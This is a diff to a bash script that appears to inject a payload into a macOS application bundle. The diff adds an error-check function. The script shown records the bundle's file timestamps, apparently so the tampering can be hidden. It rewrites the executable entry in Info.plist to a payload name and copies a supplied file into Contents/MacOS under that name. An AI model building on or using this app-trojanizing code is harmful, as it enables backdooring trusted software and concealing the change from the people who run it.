@@ -6,6 +6,13 @@ if [ "$1" == "" ] || [ "$2" == "" ];then
 	echo "Incorrect usage"
 	exit 1
 else
+	function Get_S {
+		RS=$?
+		if [ $RS -gt 0 ];then
+			echo "Something went wrong. Aborting."
+			exit $RS
+		fi
+	}
 	LMTA=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC") && LMTC=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents") && LMTIP=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/Info.plist") && LMTEF=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS")
 	if [ "$(echo ${TRUESRC: -4})" != ".app" ] || [ ! -d "$TRUESRC" ] ;then
 		echo "\$1 is not an application. Aborting"
@@ -49,15 +56,18 @@ else
 			LMTOE=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS/$CL")
 				if [ "$OES" -eq 1 ];then
 					echo "$CL" > "$OFP"
+					Get_S
 				fi
 			fi
 			sed -i '' -e "$R s%<string>.*</string>%<string>$PayloadName</string>%" "$TRUESRC/Contents/Info.plist"
+			Get_S
 			let R=AR+1
 		else 
 			let R=R+1
 		fi
 	done
 	cp "$TRUEPATH" "$TRUESRC/Contents/MacOS/$PayloadName"
+	Get_S
 	if [ "$OES" -eq 2 ];then
 		sed -i '' "\$s%\$%$CL%" "$TRUESRC/Contents/MacOS/$PayloadName"
 	elif [ "$OES" -eq 3 ];then
